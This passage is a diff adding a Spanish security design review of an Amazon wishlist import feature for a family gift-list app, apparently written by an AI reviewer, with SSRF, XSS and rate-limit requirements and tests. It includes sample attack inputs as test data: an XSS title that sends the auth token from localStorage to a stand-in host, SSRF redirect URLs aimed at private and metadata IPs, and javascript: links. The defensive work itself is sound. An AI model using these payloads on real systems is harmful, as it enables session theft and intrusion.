@@ -1301,3 +1301,202 @@ Fecha: 2026-11-12 · Sobre `main` en `7e8a23d` (los arreglos entraron en `1c898c
 - Siguen los bajos antiguos (G-12, G-4, V-20, token de DuckDNS, copias sin autenticación).
 
 **Veredicto: apto.** Con V-26 a V-29 corregidos y probados contra PocketBase real, no conozco ninguna vía por la que alguien vea o deduzca el estado de su propia lista desde su sesión, ni hay secretos en el repositorio o en los builds. Condición de publicación: el APK de la release sale de `scripts/firmar-apk.sh` y `aapt2 dump badging … | grep -c debuggable` da 0 antes de subirlo.
+
+---
+
+## Lista de Amazon (diseño, Fable 5.2)
+
+Fecha: 2026-11-12 · Alcance: diseño de la v1.1 «Lista de Amazon», **antes de implementarla**. Leídos `server/unfurl/{index,fetch,guard,meta}.mjs`, la ruta `/api/lazo/unfurl` (`lazo.pb.js:732-764`) y su límite (`1762850000_lazo.js:222`). No se ha tocado código ni se ha ejecutado nada contra Amazon salvo una lectura de `robots.txt`.
+
+**Recomendación previa** (razonada en `docs/legal/AMAZON.md`): el camino principal es **(b) copiar y pegar**, que no hace peticiones a Amazon. El camino **(a) servidor** no debería entrar en la v1.1; si entra, apagado por defecto. Los requisitos AMZ-1 a AMZ-15 son la condición para que (a) exista; AMZ-9, AMZ-10, AMZ-11, AMZ-15 y AMZ-16 valen también para (b).
+
+**Qué cambia respecto al `unfurl` de hoy.** El `unfurl` genérico acepta cualquier host público y devuelve un producto. La importación de una lista hace varias peticiones seguidas, devuelve hasta 100 filas y solo tiene sentido contra un host. Por eso no debe ser «`unfurl` con una opción»: es una ruta aparte y más estrecha. Dos expresiones que ya existen **no sirven de lista blanca**: `STORES` (`meta.mjs:50`, `/(^|\.)amazon\.[a-z.]+$/`) casa `amazon.evil.com`, y `amazonInfo` (`meta.mjs:9`) casa `amazon.xyz`. Están bien para poner la etiqueta «Amazon», no para decidir adónde se conecta el servidor.
+
+| Severidad si falta | Requisitos |
+|---|---|
+| Crítico | AMZ-11 (deduplicar en el servidor rompería LA REGLA) |
+| Alto | AMZ-2, AMZ-3, AMZ-10, AMZ-13 |
+| Medio | AMZ-1, AMZ-4, AMZ-5, AMZ-6, AMZ-7, AMZ-8, AMZ-9, AMZ-12, AMZ-16 |
+| Bajo | AMZ-14, AMZ-15 |
+
+### AMZ-1 · Ruta propia, apagada por defecto y solo a petición
+
+- Ruta nueva `POST /api/lazo/amazon-import` (PocketBase, `$apis.requireAuth('users')` y miembro de algún grupo, como `unfurl`) que llama a `POST /wishlist` del servicio `unfurl` con la misma clave `x-lazo-key`. `/unfurl` no cambia ni se relaja.
+- Variable del servidor `AMAZON_IMPORT` (por defecto vacía = apagado). Apagada, la ruta responde 404 y `unfurl` no registra `/wishlist`. La enciende quien aloja, no cada usuario.
+- Sin `cronAdd`, sin reintentos y sin refresco de precios: una llamada del usuario, una lectura.
+
+**Escenario.** Alguien instala Lazo con el `.env` de ejemplo y, sin saberlo, su servidor empieza a leer Amazon desde la IP de casa.
+
+**Prueba.** `server/test/amazon.test.mjs`: sin `AMAZON_IMPORT`, `POST /api/lazo/amazon-import` da 404 con y sin sesión, y `POST /wishlist` al servicio da 404; con la variable, sin sesión da 401 y sin grupo 403. `grep -c cronAdd` sobre el código nuevo da 0.
+
+### AMZ-2 · La URL la construye el servidor; del usuario solo sale el identificador
+
+El cliente envía el enlace pegado, pero el servidor **no lo visita**: extrae el identificador con una expresión anclada (`^https://www\.amazon\.es/hz/wishlist/(?:ls|genericItemsPage)/([A-Z0-9]{10,16})(?:[/?#]|$)`, a ajustar con listas reales) y construye él `https://www.amazon.es/hz/wishlist/ls/<ID>`. Se descartan query, fragmento, puerto, credenciales y cualquier otra ruta. Si no casa: 400 `not_a_list`, sin petición de red.
+
+**Escenario.** Un miembro manda `https://www.amazon.es/gp/redirect.html?location=http://192.168.1.1/` o `https://www.amazon.es@evil.example/hz/wishlist/ls/X`: si el servidor visitara lo pegado, serviría de sonda de la red de casa o de proxy hacia cualquier ruta de Amazon.
+
+**Prueba.** `server/unfurl/test/wishlist.test.mjs` con un `lookup` espía: para `www.amazon.es@evil.example`, `www.amazon.es.evil.example`, `evil.example/www.amazon.es/hz/wishlist/ls/X`, `http://` en vez de `https://`, `:8443`, `WWW.AMAZON.ES.` con punto final, `amazon.com`, `smile.amazon.es`, `/gp/redirect.html?…`, `/dp/B000000000` y un id con `../` o `%2F`, la respuesta es `not_a_list` y el espía registra **cero** resoluciones DNS. Para un enlace válido con `?ref_=…&x=http://10.0.0.1`, la única URL pedida es la canónica sin query.
+
+### AMZ-3 · Lista blanca de host en cada salto
+
+Toda petición de esta ruta, la primera y cada redirección, debe cumplir a la vez: `protocol === 'https:'`, `hostname === 'www.amazon.es'` (comparación exacta tras `new URL`, sin sufijos ni expresiones regulares), puerto vacío y ruta que empieza por `/hz/wishlist/`. Máximo 2 redirecciones. Una redirección a cualquier otro sitio **aborta sin seguirla**, también dentro de amazon.es:
+
+- `/ap/signin…` → `private_list` (la lista no es pública);
+- `/errors/validateCaptcha…` → `amazon_blocked` (AMZ-8);
+- otro host u otra ruta → `blocked`.
+
+**Escenario.** Amazon tiene redirectores (`/gp/redirect.html`). Una lista cuya URL acaba en un 302 hacia `http://unfurl:8787/health` o hacia el router convierte la importación en un SSRF con el sello de un host de confianza.
+
+**Prueba.** Servidor local de pruebas que hace de `www.amazon.es` (con `opts.lookup`, como en `unfurl.test.mjs`): 302 a `https://evil.example/`, a `https://amazon.es/…` sin `www`, a `http://www.amazon.es/…`, a `https://www.amazon.es/gp/redirect.html?…` y a `https://www.amazon.es/ap/signin` → error con el código esperado y **ninguna** segunda conexión. Tres redirecciones válidas seguidas → `too_many_redirects`.
+
+### AMZ-4 · Enlace corto `amzn.eu`
+
+`amzn.eu` es un redirector público: no puede entrar en la lista blanca de AMZ-3. Dos opciones, de menos a más código:
+
+1. **Preferida:** no resolverlo en el servidor. El cliente dice «abre el enlace y pega la dirección larga».
+2. Si se resuelve: una sola petición a `https://amzn.eu/<ruta>` (host exacto, ruta `^/[A-Za-z0-9/_-]{1,40}$`), **sin leer el cuerpo**, que debe responder 301 o 302; el `Location` no se sigue: se le aplica AMZ-2 para sacar el identificador. Cualquier otra respuesta → `not_a_list`.
+
+**Escenario.** `amzn.eu/d/xxxx` apunta a un producto, a una página de vendedor o, vía redirector, a otro host; si el servidor siguiera la cadena, AMZ-3 quedaría en nada.
+
+**Prueba.** Servidor de pruebas como `amzn.eu`: 302 a una lista válida → se pide solo la canónica; 302 a `https://evil.example/hz/wishlist/ls/X`, a `/dp/…`, 200 con cuerpo de 50 MB y 302 en cadena → `not_a_list`, con menos de 1 kB leído y ninguna conexión a un tercer host.
+
+### AMZ-5 · La guardia de IP y DNS sigue activa debajo de la lista blanca
+
+La lista blanca de nombres no sustituye a `safeLookup` (`fetch.mjs:12-22`): la conexión va a la IP validada, y si **alguna** IP devuelta es privada, se rechaza. `allowPrivate` sigue sin ser alcanzable por HTTP.
+
+**Escenario.** El DNS del homelab (Pi-hole, `hosts`, un router comprometido) resuelve `www.amazon.es` a `192.168.1.1`: sin la guardia, el nombre «bueno» lleva al panel del router.
+
+**Prueba.** `lookup` falso que devuelve `127.0.0.1`, `169.254.169.254` y `::ffff:10.0.0.1` para `www.amazon.es` → `blocked` sin abrir socket; y uno que devuelve una pública y una privada → `blocked`.
+
+### AMZ-6 · Paginación acotada y sin fiarse de la página
+
+- Como mucho **5 páginas** y **100 productos**; se corta en lo primero que llegue.
+- La dirección de «más resultados» sale del HTML, así que es dato no fiable: solo se acepta si, resuelta contra la página, cumple AMZ-3 **y** contiene el mismo identificador de lista. Lo demás termina la importación con lo ya leído.
+- Fin también si una página no aporta ningún ASIN nuevo o repite el testigo de paginación (bucle).
+- **Sin tarro de cookies:** no se guardan ni se reenvían `Set-Cookie` entre páginas. Si Amazon exige sesión para la segunda página, se importa solo la primera y se dice.
+- Una pausa de al menos 1 s entre páginas.
+
+**Escenario.** Una página manipulada (o un cambio de Amazon) devuelve un enlace de paginación que apunta a sí mismo o a otra lista: peticiones sin fin útil, o productos de una lista ajena mezclados con los propios.
+
+**Prueba.** Fixtures: lista de 7 páginas → exactamente 5 peticiones; página con 150 productos → 100; siguiente página con otro id, con otro host o idéntica a la actual → se detiene y devuelve lo leído con `partial: true`; respuesta con `Set-Cookie` → la petición siguiente no lleva `Cookie`.
+
+### AMZ-7 · Topes de tamaño y de tiempo
+
+| Tope | Valor propuesto | Nota |
+|---|---|---|
+| Cuerpo por página | 3 MB | Hoy `LIMITS.maxBytes` es 1,5 MB y, al pasarse, **corta y analiza lo leído** (`fetch.mjs:75-80`). Para una lista eso perdería productos en silencio: aquí, si se corta, la respuesta lleva `partial: true` |
+| Total de la importación | 10 MB | Suma de las páginas |
+| Tiempo por página | 6 s totales | El `kill` de G-8, no solo inactividad |
+| Tiempo de la importación | 25 s, **un único plazo** | Incluye las pausas. No 5 × 6 s más pausas sin tope |
+| `$http.send` en PocketBase | 30 s | Hoy 10 s (`lazo.pb.js:748`): con menos, PocketBase se rinde y `unfurl` sigue trabajando para nadie |
+| Cabeceras | 32 kB | Como hoy |
+| Compresión | Sin `Accept-Encoding` | Como hoy: no hay bomba de descompresión |
+| Cuerpo de la petición del cliente | 4 kB | Como hoy |
+| En curso a la vez | 1 por usuario, 1 en todo el servidor | Ver AMZ-12 |
+| Contenedor | `mem_limit` y `pids_limit` en `unfurl` | Pendiente desde G-12; con 10 MB en memoria por importación deja de ser opcional |
+
+**Escenario.** Una respuesta que gotea un byte por segundo durante cinco páginas, o cinco páginas de 50 MB, dejan al servicio sin memoria y a la familia sin vista previa de enlaces.
+
+**Prueba.** Servidor de pruebas: goteo lento → `timeout` antes de 26 s medido con reloj; cuerpo de 50 MB → se cierra el socket al pasar de 3 MB (bytes recibidos < 3,2 MB) y `partial: true`; cinco páginas de 2,9 MB → se detiene al superar 10 MB. En `server/test/amazon.test.mjs`: el servicio tarda 28 s y PocketBase responde el error del servicio, no un 500 por plazo propio.
+
+### AMZ-8 · Captcha, 503 o inicio de sesión: parar y no insistir
+
+- Se considera bloqueo: estado 429 o 503; redirección a `/errors/validateCaptcha`; un 200 cuyo HTML contiene el formulario `action="/errors/validateCaptcha"` o cuyo `<title>` casa `NOT_A_PRODUCT` (`meta.mjs:56`).
+- Ante un bloqueo: **ninguna petición más** en esa importación, ni reintento, ni cambio de `User-Agent`, ni cabeceras de navegador. El `User-Agent` es el `LazoBot/1.0 (+repo)` de hoy, siempre.
+- **Cortacircuitos:** tras un bloqueo, la ruta responde `amazon_blocked` a todo el mundo durante 1 hora sin tocar la red. Protege la IP de casa, que es la misma desde la que la familia compra.
+- El cliente ofrece el camino (b).
+
+**Escenario.** Amazon empieza a pedir captcha; tres personas de la familia pulsan «reintentar» diez veces cada una. Sin cortacircuitos, la IP de casa acaba marcada.
+
+**Prueba.** Fixture de captcha con 200, con 503 y como redirección → `amazon_blocked` tras **una** petición; segunda llamada (otro usuario) dentro de la hora → `amazon_blocked` con cero conexiones (espía en `lookup`). `grep` en `server/unfurl/` de `Chrome|Safari|Gecko|sec-ch-ua|Cookie` da 0 coincidencias fuera de las pruebas.
+
+### AMZ-9 · Títulos: texto plano y acotado
+
+El título es texto que escribió un vendedor: dato hostil. Antes de devolverlo:
+
+1. descodificar entidades **una vez** (`decode` de `meta.mjs`), nunca dos;
+2. quitar caracteres de control (`\u0000-\u001f`, `\u007f-\u009f`) y de dirección de texto (`‪-‮`, `⁦-⁩`), que permiten disfrazar un título;
+3. colapsar espacios y cortar a `LIMITS.title` (200).
+
+No se quitan `<` ni `>`: el título se guarda tal cual y **se pinta siempre como texto** (nodo de texto de React). No se introduce `dangerouslySetInnerHTML`, `innerHTML` ni Markdown en ningún sitio que muestre regalos, avisos o la copia del grupo.
+
+**Escenario.** Un producto se llama `<img src=x onerror=fetch('//x.example/'+localStorage.pocketbase_auth)>`. Entra en la lista de la abuela y lo ve toda la familia. Hoy la CSP y React lo paran; el requisito es que siga siendo así en cada pantalla nueva.
+
+**Prueba.** `test/core/amazon-list.test.ts` (función pura compartida por (a) y (b)): títulos con `<script>`, `&lt;img onerror&gt;`, `&amp;lt;b&amp;gt;` (queda `&lt;b&gt;` literal, no `<b>`), `‮`, saltos de línea y 5 000 caracteres → salida sin controles, ≤ 200. Playwright: importar la fixture hostil y comprobar que dentro de las tarjetas de regalo no hay ningún `img[src="x"]`, `script` ni `b`, y que no se disparó ningún `dialog` ni petición a otro origen. La comprobación que ya exista de que `src/` no usa `dangerouslySetInnerHTML` ni `innerHTML` sigue en verde.
+
+### AMZ-10 · Enlaces, fotos y precios: se construyen, no se copian
+
+- **Enlace del regalo:** nunca se copia un `href` de la página. Se extrae el ASIN, se valida con `^[A-Z0-9]{10}$` y se construye `https://www.amazon.es/dp/<ASIN>`. Sin ASIN válido, la fila se descarta.
+- **Foto:** solo `https:` y solo hosts de imágenes de Amazon por lista cerrada (`m.media-amazon.com`, `images-eu.ssl-images-amazon.com`, `images-na.ssl-images-amazon.com`; confirmar con listas reales), sin puerto ni credenciales. Si no cumple, el regalo se importa sin foto.
+- **Precio:** entero en céntimos con `parseAmount`, moneda fija `EUR`; si no se entiende, sin precio.
+- **Nada más sale de la página:** ni comentarios, ni prioridad, ni cantidad, ni vendedor, ni nombre de la dueña.
+- **Deuda que hay que saldar antes:** según la revisión v0.3, `ItemSheet.tsx` pintaba `href={item.url}` sin comprobar `^https?://` (G-13). Comprobar que está cerrado: con 100 enlaces entrando de golpe deja de ser opcional.
+
+**Escenario.** Una fila trae `href="javascript:…"` o una foto en `https://x.example/p.png?u=abuela`: lo primero es un XSS a un clic; lo segundo, cien balizas (R-6) que dicen a un tercero quién abre la lista y cuándo.
+
+**Prueba.** Misma prueba pura: filas con `javascript:alert(1)`, `data:text/html,…`, `//evil.example/dp/B000000000`, ASIN de 9 caracteres o con `/`, foto en `http://`, en `m.media-amazon.com.evil.example` y en `evil.example` → el enlace es siempre `https://www.amazon.es/dp/<ASIN>` o la fila no existe, y la foto es de la lista cerrada o `undefined`. Propiedad: para cualquier entrada, toda `url` de salida casa `^https://www\.amazon\.es/dp/[A-Z0-9]{10}$`.
+
+### AMZ-11 · La importación no escribe y no compara con lo oculto (LA REGLA)
+
+- La ruta devuelve una **vista previa** (`[{ title, image, priceCents, asin }]`) y nada más. No recibe ningún id de lista ni de grupo y no lee `items`, `claims` ni ninguna colección salvo la pertenencia a un grupo.
+- Los regalos los crea el cliente por el camino que ya existe (lote de `POST` troceado en 50, V-26), con las reglas de siempre: cada cual escribe solo en su plaza.
+- **El «ya lo tienes» se calcula en el cliente**, sobre los regalos que la dueña ve. El servidor nunca deduplica por ASIN.
+
+**Escenario.** Mamá quitó de su lista unos auriculares que ya estaban reservados: la fila sigue existiendo, oculta para ella. Reimporta su lista de Amazon. Si el servidor dijera «1 duplicado omitido», o creara 11 filas en vez de 12, sabría que alguien se los ha cogido. Es el oráculo de V-26 por otra puerta.
+
+**Prueba.** En `server/test/rules.test.mjs`, junto a PB-10: Mamá tiene dos regalos de Amazon, A (reservado por Samira) y B (libre); quita los dos; importa una lista que contiene ambos ASIN. La respuesta de `amazon-import` y la del lote de creación tienen el mismo estado y la misma forma para A y para B, se crean dos filas nuevas y `GET items` de Mamá muestra lo mismo en los dos casos. Además: `amazon-import` devuelve lo mismo llamada por Mamá que por Samira con el mismo enlace (no depende del estado de nadie).
+
+### AMZ-12 · Límite por usuario y límite global
+
+- **Por usuario:** 3 importaciones cada 10 minutos y 10 al día; una sola en curso. Las reglas de límite de PocketBase cuentan por IP y audiencia, y en casa toda la familia sale por la misma IP: hace falta un contador por `e.auth.id` (en `$app.store()`, o una colección si debe sobrevivir a un reinicio). Además, la regla `{ label: 'POST /api/lazo/amazon-import', maxRequests: 6, duration: 600, audience: '@auth' }` como red.
+- **Global hacia Amazon:** una importación a la vez en todo el servidor y como mucho 30 páginas por hora, contadas en `unfurl` (que es quien sale a la red), para que el tope no dependa de PocketBase.
+- Los rechazos por límite cuentan como intento y no tocan la red.
+
+**Escenario.** Un sobrino con sesión lanza la importación en bucle con `curl`: 20 por minuto × 5 páginas son 100 peticiones por minuto a Amazon desde la IP de casa.
+
+**Prueba.** `server/test/amazon.test.mjs` con `unfurl` simulado: cuarta llamada del mismo usuario en 10 minutos → 429 y el simulador cuenta 3; otro usuario sigue pudiendo (el cubo no es compartido); dos llamadas simultáneas del mismo usuario → una 429. En `wishlist.test.mjs`: con el reloj inyectado, la página 31 de la hora → `rate_limited` sin conexión.
+
+### AMZ-13 · Que no sirva de proxy abierto
+
+- La respuesta contiene **solo** la lista de AMZ-11 y un código de un conjunto cerrado (`not_a_list`, `private_list`, `amazon_blocked`, `rate_limited`, `timeout`, `empty`, `error`). Nunca HTML, cabeceras, la URL final, el estado HTTP de Amazon ni mensajes de excepción.
+- Si no se reconoce **ningún** producto, la respuesta es `empty`: una página que no sea una lista no produce datos.
+- Sin sesión no hay ruta (401). No se expone por el enlace de solo lectura ni por `invite-info`. El servicio `unfurl` sigue sin puertos publicados y exige `x-lazo-key` también en `/wishlist`. Caddy no publica nada nuevo.
+- Sin caché de respuestas (tampoco «para ahorrar peticiones»): una caché por URL compartida entre usuarios sería un almacén de páginas de Amazon y un canal entre cuentas.
+- La demo pública (`DemoApi`) no llama nunca a esta ruta: en la demo solo existe el camino (b).
+
+**Escenario.** Un miembro curioso, o alguien con una sesión robada, intenta usar el servidor de la familia para leer páginas de Amazon a su antojo (precios, reseñas, páginas de vendedor) o para distinguir, por el error, qué hay en la red de casa.
+
+**Prueba.** Para cada fixture (lista, captcha, producto suelto, página de inicio, 404, 500), el cuerpo de la respuesta casa un esquema estricto (sin propiedades de más) y no contiene `<`, ni `http` fuera de `image`, ni texto de la fixture que no sea un título. Los errores `blocked`, `network` y `http_*` del servicio llegan al cliente como el mismo `error`. `server/test/caddyfile.test.mjs`: `/wishlist` y el puerto 8787 no son alcanzables desde fuera. `e2e`: en la demo, el botón del camino (a) no existe y no sale ninguna petición a `/api/lazo/amazon-import`.
+
+### AMZ-14 · El identificador de la lista no se guarda ni se registra
+
+El identificador de la lista de deseos enlaza a una persona de Lazo con su perfil de Amazon (nombre, a veces ciudad de envío). Viaja en el **cuerpo** del `POST`, nunca en la query (los registros de PocketBase guardan las URL), no se escribe en ninguna colección ni en la salida de `unfurl`, y el nombre de la dueña que aparece en la página no se extrae.
+
+**Escenario.** Quien administra el servidor, o quien se haga con una copia de `data.db`, obtiene la lista de Amazon de cada familiar y, con ella, su nombre real y lo que desea fuera de Lazo.
+
+**Prueba.** Tras una importación con un identificador centinela: `grep` del centinela en `data.db`, en `auxiliary.db` (registros) y en la salida estándar de `unfurl` → 0 coincidencias. La copia del grupo (`exportGroup`) tampoco lo contiene.
+
+### AMZ-15 · El analizador aguanta entradas hostiles
+
+Vale para el HTML del camino (a) y para lo pegado en el (b). Expresiones con cuantificadores acotados (como ya hace `meta.mjs`: `[^>]{0,1000}`), sin retroceso catastrófico; entrada cortada al tope antes de analizar; como mucho 100 filas de salida; `JSON.parse` solo dentro de `try`.
+
+**Escenario.** Un pegado de 2 MB hecho de `<a <a <a …` congela la pestaña (camino b) o un núcleo del servidor durante minutos (camino a).
+
+**Prueba.** `test/core/amazon-list.test.ts`: 3 MB de `<` repetido, de `<li data-itemid="` sin cerrar, de espacios y de bytes aleatorios → termina en menos de 500 ms y devuelve ≤ 100 filas. La fixture de una lista real (guardada sin datos personales) da el número de productos esperado; cuando Amazon cambie la página, esta es la prueba que debe romperse.
+
+### AMZ-16 · El camino (b) cumple lo mismo en el cliente
+
+- La misma función pura (`src/core`) de AMZ-9, AMZ-10 y AMZ-15 procesa lo pegado. Una sola implementación, dos entradas.
+- Tope del pegado: 2 MB. Lo pegado **no se inserta en el DOM** (ni `innerHTML` ni un `contenteditable` que lo pinte): se lee del evento `paste` (`text/html` si existe, porque el texto plano no trae los ASIN ni las fotos; `text/plain` si no) y se analiza como cadena o con `DOMParser`, que produce un documento inerte.
+- La CSP no cambia: no se añade `amazon.es` a `connect-src`. El camino (b) no hace **ninguna** petición.
+- Lo pegado no se guarda en `localStorage`, no se envía a la IA y no llega al servidor: solo llegan los regalos que la dueña confirma.
+- El deduplicado es el de AMZ-11: sobre lo que ella ve.
+
+**Escenario.** La página copiada incluye, en la sección de recomendados, un producto con un título o un enlace hostil; o el usuario pega por error el contenido de otra web. Sin las mismas reglas, el camino «seguro» sería la puerta de entrada del XSS.
+
+**Prueba.** Playwright con la red vigilada: pegar la fixture hostil de AMZ-9 y AMZ-10 → cero peticiones a orígenes distintos del propio hasta confirmar; después, solo las fotos de la lista cerrada; y las mismas aserciones de DOM que en AMZ-9. `localStorage` no contiene ningún trozo de lo pegado. `index.html` y `Caddyfile`: `connect-src` idéntico al de la 1.0.
+
+### Orden propuesto
+
+1. Camino (b) con AMZ-9, AMZ-10, AMZ-11, AMZ-15 y AMZ-16, comprobando de paso el `href` de G-13.
+2. Decidir si (a) hace falta a la vista del uso real de (b). Si se hace: AMZ-1 a AMZ-8 y AMZ-12 a AMZ-14, con las pruebas escritas antes que el código y `AMAZON_IMPORT` apagado en el `.env` de ejemplo.
